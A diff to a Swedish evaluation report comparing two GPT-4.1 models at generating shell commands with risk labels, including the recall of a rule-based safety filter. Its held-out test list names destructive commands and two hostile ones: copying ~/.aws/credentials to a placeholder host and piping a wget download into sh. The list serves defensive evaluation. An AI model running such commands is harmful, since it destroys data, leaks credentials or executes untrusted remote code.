@@ -42,12 +42,15 @@ Vid n = 40 är ett 95-procentigt Wilson-intervall kring 75 % ungefär ±13 proce
 
 ## Resultat
 
+Mätt med prompt 0.1.0 på 40 uppgifter. Repot har nu 0.2.0 och 54 uppgifter, som inte är mätta.
+
 | | gpt-4.1-mini | gpt-4.1 |
 |---|---:|---:|
 | Höll på det som jämfördes | 35/40 | 33/40 |
 | Nya anrop | 35 | 35 |
 | Från cache | 5 | 5 |
 | Betalt den här körningen | 0,012 USD | 0,062 USD |
+| Medianlatens | 1226,4 ms | 1341,1 ms |
 
 Tillsammans med rökkörningen ligger hela API-kostnaden runt 0,09 USD. Den lilla modellen kostade ungefär en femtedel av den stora.
 
@@ -74,7 +77,7 @@ Siffran är andelen uppgifter som höll på det som jämfördes. För de läsand
 
 Den justerade siffran räknar de listade stavningarna som rätt, utöver det ojusterade resultatet. `gpt-4.1-mini` får 39/40. `gpt-4.1` får 37/40. Den stora skrev `ps -u $USER` på `ps-current-user`. Det är samma kommando som facit `ps -u "$USER"`, utan citattecken, och räknas rätt i den justerade siffran. `> notes.txt` och `mkdir unpacked` är inte accepterade varianter.
 
-Risknätet kan bara höja en märkning. Efter mätningen fångar det fler mönster som ser harmlösa ut. På den motståndskraftiga sviten, 20 destruktiva kommandon och 7 som inte är det, är precision 1 och recall 1. Det är en kontroll av nätet, inte en ny modellmätning. De fjorton nya destruktiva uppgifterna är inte mätta.
+Risknätet kan bara höja en märkning. Precision 1 och recall 1 gäller sviten som reglerna justerades mot: 20 destruktiva kommandon och 7 som inte är det. En separat hållen svit lämnades orörd, och reglerna ska inte lagas för att klara den. Grundsanningen där är destructive. Nätet märker 0 av 9, så recall är 0. Alla nio är `safe` i dag: `unlink f`, `git branch -D x`, `git stash drop`, `git stash clear`, `kubectl delete ns prod`, `history -c`, `npm publish`, `scp ~/.aws/credentials x:` och `sh -c "$(wget -qO- x)"`. Ett regelbaserat nät täcker aldrig allt.
 
 ## Felanalys
 
@@ -110,9 +113,9 @@ Hypoteserna skrevs innan något mätanrop. De som inte höll står kvar.
 1. På enkla kommandon, ett verktyg och få villkor, är den lilla och den stora modellen ungefär lika träffsäkra. Det stämmer. Båda klarade i stort sett alla `find`-uppgifter.
 2. På sammansatta kommandon, flera steg eller ett git-kommando där flaggan avgör om arbete förstörs, tappar den lilla och den stora klarar fler. Det höll inte, varken på totalsiffran eller på svårighetsuppdelningen. Ojusterat höll den lilla 10/11 sammansatta och 25/29 enkla. Den stora höll 9/11 sammansatta och 24/29 enkla. Den lilla ligger före på båda. Den enda sammansatta avvikelsen hos den lilla är stavningen av `curl-header-line`. Den stora har samma stavning och dessutom `unpack-sample`, där `mkdir` saknar `-p`. Den är inte en accepterad variant.
 3. Totalskillnaden blir liten, under ungefär 15 procentenheter, vilket 40 uppgifter inte kan skilja från brus. Slutsatsen blir att den billiga modellen räcker. Det stämmer. Fem procentenheter, och den billiga var före.
-4. Den lilla modellen missar farliga kommandon som inte ser farliga ut, som `find -delete` och `truncate`. Den stora flaggar fler. Det höll inte på de fyra mätta destruktiva uppgifterna. Den lilla höll 4/4. Den skrev `truncate -s 0` och märkte det `caution`. Nätet höjde till `destructive`. Den flaggade också `find -delete`, `git clean` och `rm` som `destructive`. Den stora höll 3/4. Den skrev `> notes.txt`, märkte det `destructive`, och nätet lät märkningen stå. Strängen matchar inte facit. Fjorton nya uppgifter i samma anda, bland annat `find -delete`, `git checkout -- .`, `git clean -fd`, `rsync --delete`, `sed -i` på många filer och `chmod -R`, ligger i testsetet och är inte mätta.
+4. Den lilla modellen missar farliga kommandon som inte ser farliga ut, som `find -delete` och `truncate`. Den stora flaggar fler. Det finns visst stöd i ett fall. På `truncate-notes` skrev den lilla `truncate -s 0` och märkte sitt kommando `caution`. Nätet höjde till `destructive`. Den stora skrev `> notes.txt` och märkte sitt kommando `destructive` själv. Fyra uppgifter är för lite evidens. Den lilla märkte också `find -delete`, `git clean` och `rm` som `destructive`.
 5. Båda modellerna föreslår ibland GNU-flaggor som inte finns på macOS. Den lilla gör det oftare. Det är inte mätt. Körningen tvingade GNU.
-6. Priset räknas. Den lilla modellen är snabbare och billigare per anrop. Om träffsäkerheten är nära varandra rekommenderas den billiga. Prisdelen stämmer: den lilla kostade ungefär en femtedel. Latens är inte redovisad i mätningen. Rekommendationen följer ändå, eftersom träffsäkerheten ligger inom bruset och den billiga var före.
+6. Priset räknas. Den lilla modellen är snabbare och billigare per anrop. Om träffsäkerheten är nära varandra rekommenderas den billiga. Prisdelen stämmer: den lilla kostade ungefär en femtedel. Medianen av `latency_ms` i resultatfilerna är 1226,4 ms för den lilla och 1341,1 ms för den stora. Den lilla är snabbare i den här körningen. Rekommendationen följer, eftersom träffsäkerheten ligger inom bruset och den billiga var före.
 
 ## Konkurrentanalys
 
